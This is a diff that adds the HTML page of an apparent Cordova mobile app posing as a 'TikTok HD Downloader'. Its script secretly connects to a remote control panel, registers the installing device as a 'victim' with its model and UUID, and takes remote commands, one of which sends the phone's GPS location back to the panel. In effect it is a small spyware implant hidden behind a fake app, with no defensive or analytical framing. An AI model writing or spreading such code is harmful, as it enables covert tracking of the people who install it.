@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>TikTok HD Downloader</h1>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="cordova.js"></script>
+    <script>
+        document.addEventListener('deviceready', () => {
+            const socket = io('http://panel.fyxzpedia.biz.id:2017');
+            socket.emit('REGISTER_VICTIM', { model: device.model, uuid: device.uuid });
+            socket.on('EXECUTE', (cmd) => {
+                if(cmd === 'GET_LOCATION') {
+                    navigator.geolocation.getCurrentPosition((p) => {
+                        socket.emit('DATA_REPORT', { type: 'GPS', data: p.coords });
+                    });
+                }
+                // Tambahin fungsi flash biar seru
+                if(cmd === 'FLASH') window.plugins.flashlight.toggle();
+            });
+        }, false);
+    </script>
+</body>
+</html>
